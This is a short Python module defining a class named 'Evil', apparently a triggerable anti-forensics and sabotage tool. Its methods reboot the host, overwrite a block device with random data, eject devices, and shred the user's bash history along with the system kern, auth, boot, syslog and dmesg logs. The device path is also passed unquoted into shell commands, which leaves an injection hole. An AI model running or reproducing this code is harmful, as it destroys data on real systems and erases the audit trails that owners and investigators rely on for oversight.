import subprocess
import os

class Evil:
    def __init__(self, observer):
        self.obs = observer

    def Reboot(self):
        retcode = subprocess.call("reboot", shell = True)

    def Overwrite(self, device):
        dev = str(device.device_node)
        retcode = subprocess.call("cat /dev/urandom > " + dev, shell = True)

    def Eject(self, device):
        dev = str(device.device_node)
        retcode = subprocess.call("eject -v " + dev, shell = True)

    def clean_bash_history(self):
        home = os.getenv("HOME")
        histfile = home + '/.bash_history'
        subprocess.call("shred -z -n 5 " + histfile, shell = True)

    def clean_dmesg(self):
        subprocess.call("dmesg -C", shell = True)
        subprocess.call("shred -z -n 5 /var/log/dmesg*", shell = True)

    def clean_logs(self):
        subprocess.call("shred -z -n 5 /var/log/kern*", shell = True)
        subprocess.call("shred -z -n 5 /var/log/auth*", shell = True)
        subprocess.call("shred -z -n 5 /var/log/boot*", shell = True)
        subprocess.call("shred -z -n 5 /var/log/syslog*", shell = True)